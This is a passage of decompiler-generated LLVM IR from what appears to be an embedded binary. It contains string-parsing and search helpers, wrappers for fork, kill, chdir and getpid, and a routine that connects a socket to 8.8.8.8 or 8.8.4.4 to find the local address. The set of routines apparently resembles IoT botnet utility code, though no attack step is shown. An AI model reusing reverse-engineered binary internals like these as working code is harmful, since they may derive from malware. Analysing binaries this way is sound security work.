  %v0_4045bc.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_4045bc

dec_label_pc_4045bc:                              ; preds = %dec_label_pc_4045bc, %dec_label_pc_4045bc, %dec_label_pc_4045d0, %dec_label_pc_4045b0
  %v0_4045bc = phi i32 [ %v0_4045bc.pre, %dec_label_pc_4045b0 ], [ %v1_4045c0, %dec_label_pc_4045d0 ], [ %v1_4045c0, %dec_label_pc_4045bc ], [ %v1_4045c0, %dec_label_pc_4045bc ]
  %v1_4045bc = inttoptr i32 %v0_4045bc to i8*
  %v2_4045bc = load i8, i8* %v1_4045bc, align 1
  %v3_4045bc = sext i8 %v2_4045bc to i32
  %v1_4045c0 = add i32 %v0_4045bc, 1
  switch i8 %v2_4045bc, label %dec_label_pc_4045d0 [
    i8 32, label %dec_label_pc_4045bc
    i8 9, label %dec_label_pc_4045bc
  ]

dec_label_pc_4045d0:                              ; preds = %dec_label_pc_4045bc
  %v2_4045d4 = icmp eq i8 %v2_4045bc, 10
  br i1 %v2_4045d4, label %dec_label_pc_4045bc, label %dec_label_pc_4045d8

dec_label_pc_4045d8:                              ; preds = %dec_label_pc_4045d0
  %v1_4045e8 = add i32 %v0_4045bc, 2
  br label %dec_label_pc_4045f4

dec_label_pc_4045f4:                              ; preds = %dec_label_pc_4046e8, %dec_label_pc_4045d8
  %v1_40471420 = phi i32 [ %v1_4046f0, %dec_label_pc_4046e8 ], [ 10, %dec_label_pc_4045d8 ]
  %v0_404600 = phi i32 [ %v0_404600824, %dec_label_pc_4046e8 ], [ %v1_4045e8, %dec_label_pc_4045d8 ]
  %v0_4045f8 = phi i32 [ %v0_4046f423, %dec_label_pc_4046e8 ], [ %v3_4045bc, %dec_label_pc_4045d8 ]
  %v2_4045f8 = icmp eq i32 %v0_4045f8, 43
  br i1 %v2_4045f8, label %dec_label_pc_4045fc, label %dec_label_pc_404714

dec_label_pc_4045fc:                              ; preds = %dec_label_pc_4045f4
  %v1_404600 = inttoptr i32 %v0_404600 to i8*
  %v2_404600 = load i8, i8* %v1_404600, align 1
  %v3_404600 = sext i8 %v2_404600 to i32
  %v1_404608 = add i32 %v0_404600, 1
  %v6_40460c = sdiv i32 43, %tmp
  %v7_40460c = srem i32 43, %tmp
  %v1_404628 = urem i32 %v3_404600, 256
  %fold = add nsw i32 %v3_404600, 208
  %v1_404630 = and i32 %fold, 254
  %v1_404634 = icmp ult i32 %v1_404630, 10
  %v1_404638 = icmp eq i1 %v1_404634, false
  %v3_404638 = add nuw nsw i32 %v1_404628, 191
  br i1 %v1_404638, label %dec_label_pc_404648, label %dec_label_pc_40463c

dec_label_pc_40463c:                              ; preds = %dec_label_pc_4045fc
  %v1_404644 = add nsw i32 %v3_404600, -48
  br label %dec_label_pc_404648

dec_label_pc_404648:                              ; preds = %dec_label_pc_4045fc, %dec_label_pc_40463c
  %v0_404658 = phi i32 [ %v1_404628, %dec_label_pc_4045fc ], [ %v1_404644, %dec_label_pc_40463c ]
  %v1_404648 = and i32 %v3_404638, 254
  %v1_40464c = icmp ult i32 %v1_404648, 26
  br i1 %v1_40464c, label %dec_label_pc_40466c, label %dec_label_pc_404654

dec_label_pc_404654:                              ; preds = %dec_label_pc_404648
  %v1_404658 = add nsw i32 %v0_404658, 159
  %v1_40465c = and i32 %v1_404658, 254
  %v1_404660 = icmp ult i32 %v1_40465c, 26
  %v1_404664 = icmp eq i1 %v1_404660, false
  br i1 %v1_404664, label %dec_label_pc_4046e8, label %dec_label_pc_40466c

dec_label_pc_40466c:                              ; preds = %dec_label_pc_404654, %dec_label_pc_404648
  %v1_40466c = phi i32 [ 87, %dec_label_pc_404654 ], [ 55, %dec_label_pc_404648 ]
  %v2_40466c = sub nsw i32 %v3_404600, %v1_40466c
  %v3_404670 = icmp slt i32 %v2_40466c, %tmp
  %v4_404670 = zext i1 %v3_404670 to i32
  %v1_404674 = icmp eq i1 %v3_404670, false
  br i1 %v1_404674, label %dec_label_pc_4046e8, label %dec_label_pc_404678

dec_label_pc_404678:                              ; preds = %dec_label_pc_40466c
  %v4_40467c = icmp slt i32 %v6_40460c, 0
  %v1_404684 = icmp eq i1 %v4_40467c, false
  br i1 %v1_404684, label %dec_label_pc_404688, label %dec_label_pc_4046d8

dec_label_pc_404688:                              ; preds = %dec_label_pc_404678
  %v2_40468c = icmp eq i32 %v6_40460c, 0
  br i1 %v2_40468c, label %dec_label_pc_404690, label %dec_label_pc_4046a0

dec_label_pc_404690:                              ; preds = %dec_label_pc_404688
  %v2_404694 = icmp slt i32 %v7_40460c, %v2_40466c
  br i1 %v2_404694, label %dec_label_pc_4046d8, label %dec_label_pc_4046a0

dec_label_pc_4046a0:                              ; preds = %dec_label_pc_404690, %dec_label_pc_404688
  br label %dec_label_pc_4046d8

dec_label_pc_4046d8:                              ; preds = %dec_label_pc_404678, %dec_label_pc_404690, %dec_label_pc_4046a0
  %v1_4046bc = add i32 %v0_404600, 2
  br label %dec_label_pc_4046e8

dec_label_pc_4046e8:                              ; preds = %dec_label_pc_404654, %dec_label_pc_40466c, %dec_label_pc_4046d8
  %v0_404600824 = phi i32 [ %v1_4046bc, %dec_label_pc_4046d8 ], [ %v1_404608, %dec_label_pc_40466c ], [ %v1_404608, %dec_label_pc_404654 ]
  %v0_4046f423 = phi i32 [ %v2_40466c, %dec_label_pc_4046d8 ], [ %v2_40466c, %dec_label_pc_40466c ], [ %v0_404658, %dec_label_pc_404654 ]
  %v1_4046f4 = phi i32 [ 2147418112, %dec_label_pc_4046d8 ], [ %v4_404670, %dec_label_pc_40466c ], [ 87, %dec_label_pc_404654 ]
  %v0_4046f0 = phi i32 [ 2147483647, %dec_label_pc_4046d8 ], [ 0, %dec_label_pc_40466c ], [ 0, %dec_label_pc_404654 ]
  %v1_4046f0 = sub nsw i32 0, %v0_4046f0
  %v2_4046f4 = icmp eq i32 %v0_4046f423, %v1_4046f4
  br i1 %v2_4046f4, label %dec_label_pc_404714, label %dec_label_pc_4045f4

dec_label_pc_404714:                              ; preds = %dec_label_pc_4045f4, %dec_label_pc_4046e8
  %v1_40471422 = phi i32 [ %v1_4046f0, %dec_label_pc_4046e8 ], [ %v1_40471420, %dec_label_pc_4045f4 ]
  ret i32 %v1_40471422

; uselistorder directives
  uselistorder i32 %v1_4046f0, { 1, 0 }
  uselistorder i32 %v1_404628, { 1, 0 }
  uselistorder i32 %v3_404600, { 1, 2, 3, 0 }
  uselistorder i32 %v0_404600, { 0, 2, 1 }
  uselistorder i32 %v1_4045c0, { 2, 1, 0 }
  uselistorder i8 %v2_4045bc, { 1, 0, 2 }
  uselistorder i32 %v0_4045bc, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 55, { 1, 2, 0, 3 }
  uselistorder i32 43, { 1, 0, 2 }
  uselistorder label %dec_label_pc_404714, { 1, 0 }
  uselistorder label %dec_label_pc_4046e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4046d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_404648, { 1, 0 }
  uselistorder label %dec_label_pc_4045bc, { 2, 1, 0, 3 }
}

define i32 @function_40471c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40471c:
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %s1.global-to-local, align 4
  store i32 %arg2, i32* %s4.global-to-local, align 4
  store i32 %arg3, i32* %s3.global-to-local, align 4
  store i32 %tmp, i32* @s0, align 4
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_40475c

dec_label_pc_40475c:                              ; preds = %dec_label_pc_404790.dec_label_pc_40475c_crit_edge, %dec_label_pc_40471c
  %v0_404764 = phi i32 [ %v0_404764.pre, %dec_label_pc_404790.dec_label_pc_40475c_crit_edge ], [ %arg3, %dec_label_pc_40471c ]
  %v0_404760 = phi i32 [ %v4_40477c, %dec_label_pc_404790.dec_label_pc_40475c_crit_edge ], [ %tmp, %dec_label_pc_40471c ]
  %v3_40475c = load i32, i32* @global_var_44939c.48, align 4
  store i32 %v3_40475c, i32* @t9, align 4
  %tmp14 = inttoptr i32 %v0_404760 to i32*
  %v6_404768 = call i32 @function_404ee0(i32 %v0_404764, i32* %tmp14, i32 1)
  %v0_404774 = load i32, i32* @s0, align 4
  %v2_40477c = icmp eq i32 %v6_404768, 1
  %v4_40477c = add i32 %v0_404774, 1
  store i32 %v4_40477c, i32* @s0, align 4
  %v0_404784 = load i32, i32* %s2.global-to-local, align 4
  br i1 %v2_40477c, label %dec_label_pc_404780, label %dec_label_pc_4047a4

dec_label_pc_404780:                              ; preds = %dec_label_pc_40475c
  %v1_404784 = add i32 %v0_404784, 1
  store i32 %v1_404784, i32* %s2.global-to-local, align 4
  %v1_404788 = load i32, i32* %s4.global-to-local, align 4
  %v2_404788 = icmp slt i32 %v1_404784, %v1_404788
  %v1_40478c = icmp eq i1 %v2_404788, false
  br i1 %v1_40478c, label %dec_label_pc_4047a4, label %dec_label_pc_404790

dec_label_pc_404790:                              ; preds = %dec_label_pc_404780
  %v1_404794 = inttoptr i32 %v0_404774 to i8*
  %v2_404794 = load i8, i8* %v1_404794, align 1
  %v2_40479c = icmp eq i8 %v2_404794, 10
  br i1 %v2_40479c, label %dec_label_pc_4047a4, label %dec_label_pc_404790.dec_label_pc_40475c_crit_edge

dec_label_pc_404790.dec_label_pc_40475c_crit_edge: ; preds = %dec_label_pc_404790
  %v0_404764.pre = load i32, i32* %s3.global-to-local, align 4
  br label %dec_label_pc_40475c

dec_label_pc_4047a4:                              ; preds = %dec_label_pc_40475c, %dec_label_pc_404780, %dec_label_pc_404790
  %v0_4047a4 = phi i32 [ %v1_404784, %dec_label_pc_404790 ], [ %v1_404784, %dec_label_pc_404780 ], [ %v0_404784, %dec_label_pc_40475c ]
  %v1_4047a4 = icmp eq i32 %v0_4047a4, 0
  %v2_4047a4 = load i32, i32* %s1.global-to-local, align 4
  br i1 %v1_4047a4, label %dec_label_pc_4047a8, label %dec_label_pc_4047b4

dec_label_pc_4047a8:                              ; preds = %dec_label_pc_4047a4
  store i32 0, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4047b4

dec_label_pc_4047b4:                              ; preds = %dec_label_pc_4047a4, %dec_label_pc_4047a8
  %v4_4047cc = phi i32 [ %v2_4047a4, %dec_label_pc_4047a4 ], [ 0, %dec_label_pc_4047a8 ]
  ret i32 %v4_4047cc

; uselistorder directives
  uselistorder i32 %v4_40477c, { 1, 0 }
  uselistorder label %dec_label_pc_4047b4, { 1, 0 }
  uselistorder label %dec_label_pc_4047a4, { 2, 1, 0 }
}

define i32 @function_4047d4() local_unnamed_addr {
dec_label_pc_4047d4:
  %v3_4047ec = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_4047ec, i32* @t9, align 4
  %v1_4047f4 = call i32 @function_402978()
  %v1_4047fc = urem i32 %v1_4047f4, 2
  %v1_404808 = icmp eq i32 %v1_4047fc, 0
  %. = select i1 %v1_404808, i32 134744072, i32 67373064
  ret i32 %.

; uselistorder directives
  uselistorder i32 ()* @function_402978, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
}

define i32 @function_404834() local_unnamed_addr {
dec_label_pc_404834:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_404854 = load i32, i32* @global_var_449444.206, align 4
  store i32 %v3_404854, i32* @t9, align 4
  store i32 16, i32* %stack_var_-40, align 4
  store i32 0, i32* @a2, align 4
  %v4_404868 = call i32 @function_405be0(i32 2, i32 1)
  store i32 %v4_404868, i32* @s0, align 4
  %v3_404880 = load i32, i32* @global_var_449324.227, align 4
  store i32 %v3_404880, i32* @t9, align 4
  %v2_404884 = icmp eq i32 %v4_404868, -1
  br i1 %v2_404884, label %dec_label_pc_404904, label %dec_label_pc_404888

dec_label_pc_404888:                              ; preds = %dec_label_pc_404834
  store i32 2, i32* %stack_var_-36, align 4
  %v6_404890 = call i32 @function_4047d4()
  %v3_4048a0 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4048a0, i32* @t9, align 4
  %v6_4048a8 = call i32 @function_4055d0()
  %v3_4048b8 = load i32, i32* @global_var_4494a8.209, align 4
  store i32 %v3_4048b8, i32* @t9, align 4
  %v0_4048bc = load i32, i32* @s0, align 4
  %v2_4048c4 = inttoptr i32 %v6_4048a8 to i32*
  store i32 0, i32* %v2_4048c4, align 4
  %v6_4048c4 = bitcast i32* %stack_var_-36 to %sockaddr*
  %v7_4048c4 = call i32 @function_405800(i32 %v0_4048bc, %sockaddr* %v6_4048c4, i32 16)
  %v0_4048d0 = load i32, i32* @s0, align 4
  %v3_4048d4 = load i32, i32* @global_var_449280.302, align 4
  store i32 %v3_4048d4, i32* @t9, align 4
  %v3_4048dc = ptrtoint i32* %stack_var_-40 to i32
  %v8_4048dc = call i32 @function_405860(i32 %v0_4048d0, %sockaddr* %v6_4048c4, i32 %v3_4048dc)
  %v3_4048ec = load i32, i32* @global_var_44928c.154, align 4
  store i32 %v3_4048ec, i32* @t9, align 4
  %v1_4048f4 = load i32, i32* @s0, align 4
  %v3_4048f4 = call i32 @function_404b10(i32 %v1_4048f4)
  br label %dec_label_pc_404904

dec_label_pc_404904:                              ; preds = %dec_label_pc_404834, %dec_label_pc_404888
  %v0_404910 = phi i32 [ 0, %dec_label_pc_404834 ], [ %v6_404890, %dec_label_pc_404888 ]
  ret i32 %v0_404910

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 ()* @function_4047d4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_405be0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_404904, { 1, 0 }
}

define i32 @function_40491c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40491c:
  %t2.global-to-local = alloca i32, align 4
  store i32 0, i32* %t2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_404928

dec_label_pc_404928:                              ; preds = %dec_label_pc_404928, %dec_label_pc_40491c
  %v0_40492c = phi i32 [ %v3_404934, %dec_label_pc_404928 ], [ %arg2, %dec_label_pc_40491c ]
  %v0_404928 = phi i32 [ %v1_404928, %dec_label_pc_404928 ], [ 0, %dec_label_pc_40491c ]
  %v1_404928 = add i32 %v0_404928, 1
  %v1_40492c = inttoptr i32 %v0_40492c to i8*
  %v2_40492c = load i8, i8* %v1_40492c, align 1
  %v1_404934 = icmp eq i8 %v2_40492c, 0
  %v3_404934 = add i32 %v0_40492c, 1
  br i1 %v1_404934, label %dec_label_pc_404938, label %dec_label_pc_404928

dec_label_pc_404938:                              ; preds = %dec_label_pc_404928
  %v0_404960.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_404944

dec_label_pc_404944:                              ; preds = %dec_label_pc_4049a0, %dec_label_pc_404938
  %v0_404960 = phi i32 [ %v1_404960, %dec_label_pc_4049a0 ], [ %v0_404960.pre, %dec_label_pc_404938 ]
  %v0_404948 = phi i32 [ %v0_4049485, %dec_label_pc_4049a0 ], [ %v3_404934, %dec_label_pc_404938 ]
  %v0_404964 = phi i32 [ %v1_404964, %dec_label_pc_4049a0 ], [ %tmp, %dec_label_pc_404938 ]
  %v1_404944 = inttoptr i32 %v0_404964 to i8*
  %v2_404944 = load i8, i8* %v1_404944, align 1
  %v3_404944 = sext i8 %v2_404944 to i32
  %v1_404948 = inttoptr i32 %v0_404948 to i8*
  %v2_404948 = load i8, i8* %v1_404948, align 1
  %v3_404948 = sext i8 %v2_404948 to i32
  %v1_40494c = add nsw i32 %v3_404944, 191
  %v1_404950 = add nsw i32 %v3_404948, 191
  %v1_404954 = and i32 %v1_40494c, 254
  %v1_404958 = and i32 %v1_404950, 254
  %v1_40495c = icmp ult i32 %v1_404954, 26
  %v1_404960 = add i32 %v0_404960, -1
  %v1_404964 = add i32 %v0_404964, 1
  %v1_404968 = icmp eq i1 %v1_40495c, false
  %v3_404968 = icmp ult i32 %v1_404958, 26
  br i1 %v1_404968, label %dec_label_pc_404974, label %dec_label_pc_40496c

dec_label_pc_40496c:                              ; preds = %dec_label_pc_404944
  %v1_404970 = or i32 %v3_404944, 96
  br label %dec_label_pc_404974

dec_label_pc_404974:                              ; preds = %dec_label_pc_404944, %dec_label_pc_40496c
  %v0_404980 = phi i32 [ %v3_404944, %dec_label_pc_404944 ], [ %v1_404970, %dec_label_pc_40496c ]
  %v1_404974 = icmp eq i1 %v3_404968, false
  br i1 %v1_404974, label %dec_label_pc_404980, label %dec_label_pc_404978

dec_label_pc_404978:                              ; preds = %dec_label_pc_404974
  %v1_40497c = or i32 %v3_404948, 96
  br label %dec_label_pc_404980

dec_label_pc_404980:                              ; preds = %dec_label_pc_404974, %dec_label_pc_404978
  %v1_404980 = phi i32 [ %v3_404948, %dec_label_pc_404974 ], [ %v1_40497c, %dec_label_pc_404978 ]
  %v2_404980 = icmp eq i32 %v0_404980, %v1_404980
  br i1 %v2_404980, label %dec_label_pc_404984, label %dec_label_pc_404998

dec_label_pc_404984:                              ; preds = %dec_label_pc_404980
  %v0_404988 = load i32, i32* %t2.global-to-local, align 4
  %v2_404988 = icmp eq i32 %v0_404988, %v1_404928
  %v6_404988 = add i32 %v0_404988, %arg2
  br i1 %v2_404988, label %dec_label_pc_40498c, label %dec_label_pc_4049a0

dec_label_pc_40498c:                              ; preds = %dec_label_pc_404984
  %v4_404990 = sub i32 %v1_404964, %tmp
  ret i32 %v4_404990

dec_label_pc_404998:                              ; preds = %dec_label_pc_404980
  store i32 0, i32* %t2.global-to-local, align 4
  br label %dec_label_pc_4049a0

dec_label_pc_4049a0:                              ; preds = %dec_label_pc_404984, %dec_label_pc_404998
  %v2_4049a0 = phi i32 [ %v0_404988, %dec_label_pc_404984 ], [ 0, %dec_label_pc_404998 ]
  %v0_4049485 = phi i32 [ %v6_404988, %dec_label_pc_404984 ], [ %arg2, %dec_label_pc_404998 ]
  %v1_4049a0 = icmp sgt i32 %v1_404960, 0
  %v3_4049a0 = add i32 %v2_4049a0, 1
  store i32 %v3_4049a0, i32* %t2.global-to-local, align 4
  br i1 %v1_4049a0, label %dec_label_pc_404944, label %dec_label_pc_4049a4

dec_label_pc_4049a4:                              ; preds = %dec_label_pc_4049a0
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_404988, { 1, 0, 2 }
  uselistorder i32 %v0_40492c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %t2.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32 26, { 4, 5, 6, 7, 1, 8, 2, 3, 0, 9 }
  uselistorder i32 254, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9 }
  uselistorder i32 191, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4049a0, { 1, 0 }
  uselistorder label %dec_label_pc_404980, { 1, 0 }
  uselistorder label %dec_label_pc_404974, { 1, 0 }
}

define i32 @function_4049b0() local_unnamed_addr {
dec_label_pc_4049b0:
  %s0.global-to-local = alloca i32, align 4
  %v0_4049cc = load i32, i32* @a1, align 4
  %v1_4049cc = add i32 %v0_4049cc, -33
  %v1_4049d4 = icmp ult i32 %v1_4049cc, 3
  %v3_4049d8 = load i32, i32* @global_var_449378.303, align 4
  store i32 %v3_4049d8, i32* @t9, align 4
  %v1_4049e4 = icmp eq i1 %v1_4049d4, false
  br i1 %v1_4049e4, label %dec_label_pc_404a00, label %dec_label_pc_4049e8

dec_label_pc_4049e8:                              ; preds = %dec_label_pc_4049b0
  %v1_4049ec = call i32 @function_404a40()
  %v1_404a04.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_404a00

dec_label_pc_404a00:                              ; preds = %dec_label_pc_4049b0, %dec_label_pc_4049e8
  %v1_404a04 = phi i32 [ %v0_4049cc, %dec_label_pc_4049b0 ], [ %v1_404a04.pre, %dec_label_pc_4049e8 ]
  %v0_404a04 = load i32, i32* @a0, align 4
  %v2_404a04 = call i32 (i32, i32, ...) @fcntl(i32 %v0_404a04, i32 %v1_404a04)
  %v3_404a08 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404a08, i32* @t9, align 4
  %v0_404a0c = load i32, i32* @a3, align 4
  %v1_404a0c = icmp eq i32 %v0_404a0c, 0
  store i32 %v2_404a04, i32* %s0.global-to-local, align 4
  br i1 %v1_404a0c, label %dec_label_pc_404a28, label %dec_label_pc_404a10

dec_label_pc_404a10:                              ; preds = %dec_label_pc_404a00
  %v1_404a14 = call i32 @function_4055d0()
  %v0_404a20 = load i32, i32* %s0.global-to-local, align 4
  %v2_404a20 = inttoptr i32 %v1_404a14 to i32*
  store i32 %v0_404a20, i32* %v2_404a20, align 4
  br label %dec_label_pc_404a28

dec_label_pc_404a28:                              ; preds = %dec_label_pc_404a00, %dec_label_pc_404a10
  %v4_404a30 = phi i32 [ %v2_404a04, %dec_label_pc_404a00 ], [ -1, %dec_label_pc_404a10 ]
  ret i32 %v4_404a30

; uselistorder directives
  uselistorder label %dec_label_pc_404a28, { 1, 0 }
  uselistorder label %dec_label_pc_404a00, { 1, 0 }
}

define i32 @function_404a40() local_unnamed_addr {
dec_label_pc_404a40:
  %s0.global-to-local = alloca i32, align 4
  %v0_404a64 = load i32, i32* @a3, align 4
  %v3_404a74 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404a74, i32* @t9, align 4
  %v1_404a78 = icmp eq i32 %v0_404a64, 0
  store i32 4220, i32* %s0.global-to-local, align 4
  br i1 %v1_404a78, label %dec_label_pc_404a94, label %dec_label_pc_404a7c

dec_label_pc_404a7c:                              ; preds = %dec_label_pc_404a40
  %v1_404a80 = call i32 @function_4055d0()
  %v0_404a8c = load i32, i32* %s0.global-to-local, align 4
  %v2_404a8c = inttoptr i32 %v1_404a80 to i32*
  store i32 %v0_404a8c, i32* %v2_404a8c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404a94

dec_label_pc_404a94:                              ; preds = %dec_label_pc_404a40, %dec_label_pc_404a7c
  %v0_404a94 = phi i32 [ 4220, %dec_label_pc_404a40 ], [ -1, %dec_label_pc_404a7c ]
  ret i32 %v0_404a94

; uselistorder directives
  uselistorder label %dec_label_pc_404a94, { 1, 0 }
}

define i32 @function_404ab0(i8* %arg1) local_unnamed_addr {
dec_label_pc_404ab0:
  %s0.global-to-local = alloca i32, align 4
  %v3_404ad0 = call i32 @chdir(i8* %arg1)
  %v3_404ad4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404ad4, i32* @t9, align 4
  %v0_404ad8 = load i32, i32* @a3, align 4
  %v1_404ad8 = icmp eq i32 %v0_404ad8, 0
  store i32 %v3_404ad0, i32* %s0.global-to-local, align 4
  br i1 %v1_404ad8, label %dec_label_pc_404af4, label %dec_label_pc_404adc

dec_label_pc_404adc:                              ; preds = %dec_label_pc_404ab0
  %v1_404ae0 = call i32 @function_4055d0()
  %v0_404aec = load i32, i32* %s0.global-to-local, align 4
  %v2_404aec = inttoptr i32 %v1_404ae0 to i32*
  store i32 %v0_404aec, i32* %v2_404aec, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404af4

dec_label_pc_404af4:                              ; preds = %dec_label_pc_404ab0, %dec_label_pc_404adc
  %v0_404af4 = phi i32 [ %v3_404ad0, %dec_label_pc_404ab0 ], [ -1, %dec_label_pc_404adc ]
  ret i32 %v0_404af4

; uselistorder directives
  uselistorder label %dec_label_pc_404af4, { 1, 0 }
}

define i32 @function_404b10(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b10:
  %s0.global-to-local = alloca i32, align 4
  %v1_404b30 = call i32 @close(i32 %arg1)
  %v3_404b34 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404b34, i32* @t9, align 4
  %v0_404b38 = load i32, i32* @a3, align 4
  %v1_404b38 = icmp eq i32 %v0_404b38, 0
  store i32 %v1_404b30, i32* %s0.global-to-local, align 4
  br i1 %v1_404b38, label %dec_label_pc_404b54, label %dec_label_pc_404b3c

dec_label_pc_404b3c:                              ; preds = %dec_label_pc_404b10
  %v1_404b40 = call i32 @function_4055d0()
  %v0_404b4c = load i32, i32* %s0.global-to-local, align 4
  %v2_404b4c = inttoptr i32 %v1_404b40 to i32*
  store i32 %v0_404b4c, i32* %v2_404b4c, align 4
  br label %dec_label_pc_404b54

dec_label_pc_404b54:                              ; preds = %dec_label_pc_404b10, %dec_label_pc_404b3c
  %v4_404b5c = phi i32 [ %v1_404b30, %dec_label_pc_404b10 ], [ -1, %dec_label_pc_404b3c ]
  ret i32 %v4_404b5c

; uselistorder directives
  uselistorder label %dec_label_pc_404b54, { 1, 0 }
}

define i32 @function_404b70() local_unnamed_addr {
dec_label_pc_404b70:
  %s0.global-to-local = alloca i32, align 4
  %v0_404b90 = call i32 @fork()
  %v3_404b94 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404b94, i32* @t9, align 4
  %v0_404b98 = load i32, i32* @a3, align 4
  %v1_404b98 = icmp eq i32 %v0_404b98, 0
  store i32 %v0_404b90, i32* %s0.global-to-local, align 4
  br i1 %v1_404b98, label %dec_label_pc_404bb4, label %dec_label_pc_404b9c

dec_label_pc_404b9c:                              ; preds = %dec_label_pc_404b70
  %v1_404ba0 = call i32 @function_4055d0()
  %v0_404bac = load i32, i32* %s0.global-to-local, align 4
  %v2_404bac = inttoptr i32 %v1_404ba0 to i32*
  store i32 %v0_404bac, i32* %v2_404bac, align 4
  br label %dec_label_pc_404bb4

dec_label_pc_404bb4:                              ; preds = %dec_label_pc_404b70, %dec_label_pc_404b9c
  %v4_404bbc = phi i32 [ %v0_404b90, %dec_label_pc_404b70 ], [ -1, %dec_label_pc_404b9c ]
  ret i32 %v4_404bbc

; uselistorder directives
  uselistorder label %dec_label_pc_404bb4, { 1, 0 }
}

define i32 @function_404bd0() local_unnamed_addr {
dec_label_pc_404bd0:
  %s0.global-to-local = alloca i32, align 4
  %v0_404bf0 = call i32 @getpid()
  %v3_404bf4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404bf4, i32* @t9, align 4
  %v0_404bf8 = load i32, i32* @a3, align 4
  %v1_404bf8 = icmp eq i32 %v0_404bf8, 0
  store i32 %v0_404bf0, i32* %s0.global-to-local, align 4
  br i1 %v1_404bf8, label %dec_label_pc_404c14, label %dec_label_pc_404bfc

dec_label_pc_404bfc:                              ; preds = %dec_label_pc_404bd0
  %v1_404c00 = call i32 @function_4055d0()
  %v0_404c0c = load i32, i32* %s0.global-to-local, align 4
  %v2_404c0c = inttoptr i32 %v1_404c00 to i32*
  store i32 %v0_404c0c, i32* %v2_404c0c, align 4
  br label %dec_label_pc_404c14

dec_label_pc_404c14:                              ; preds = %dec_label_pc_404bd0, %dec_label_pc_404bfc
  %v4_404c1c = phi i32 [ %v0_404bf0, %dec_label_pc_404bd0 ], [ -1, %dec_label_pc_404bfc ]
  ret i32 %v4_404c1c

; uselistorder directives
  uselistorder label %dec_label_pc_404c14, { 1, 0 }
}

define i32 @function_404c30() local_unnamed_addr {
dec_label_pc_404c30:
  %s0.global-to-local = alloca i32, align 4
  %v0_404c50 = call i32 @getppid()
  %v3_404c54 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404c54, i32* @t9, align 4
  %v0_404c58 = load i32, i32* @a3, align 4
  %v1_404c58 = icmp eq i32 %v0_404c58, 0
  store i32 %v0_404c50, i32* %s0.global-to-local, align 4
  br i1 %v1_404c58, label %dec_label_pc_404c74, label %dec_label_pc_404c5c

dec_label_pc_404c5c:                              ; preds = %dec_label_pc_404c30
  %v1_404c60 = call i32 @function_4055d0()
  %v0_404c6c = load i32, i32* %s0.global-to-local, align 4
  %v2_404c6c = inttoptr i32 %v1_404c60 to i32*
  store i32 %v0_404c6c, i32* %v2_404c6c, align 4
  br label %dec_label_pc_404c74

dec_label_pc_404c74:                              ; preds = %dec_label_pc_404c30, %dec_label_pc_404c5c
  %v4_404c7c = phi i32 [ %v0_404c50, %dec_label_pc_404c30 ], [ -1, %dec_label_pc_404c5c ]
  ret i32 %v4_404c7c

; uselistorder directives
  uselistorder label %dec_label_pc_404c74, { 1, 0 }
}

define i32 @function_404c90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404c90:
  %s0.global-to-local = alloca i32, align 4
  %v2_404cb0 = call i32 @kill(i32 %arg1, i32 %arg2)
  %v3_404cb4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404cb4, i32* @t9, align 4
  %v0_404cb8 = load i32, i32* @a3, align 4
  %v1_404cb8 = icmp eq i32 %v0_404cb8, 0
  store i32 %v2_404cb0, i32* %s0.global-to-local, align 4
  br i1 %v1_404cb8, label %dec_label_pc_404cd4, label %dec_label_pc_404cbc

dec_label_pc_404cbc:                              ; preds = %dec_label_pc_404c90
  %v1_404cc0 = call i32 @function_4055d0()
  %v0_404ccc = load i32, i32* %s0.global-to-local, align 4
  %v2_404ccc = inttoptr i32 %v1_404cc0 to i32*
  store i32 %v0_404ccc, i32* %v2_404ccc, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404cd4

dec_label_pc_404cd4:                              ; preds = %dec_label_pc_404c90, %dec_label_pc_404cbc
  %v0_404cd4 = phi i32 [ %v2_404cb0, %dec_label_pc_404c90 ], [ -1, %dec_label_pc_404cbc ]
  ret i32 %v0_404cd4

; uselistorder directives
  uselistorder label %dec_label_pc_404cd4, { 1, 0 }
}

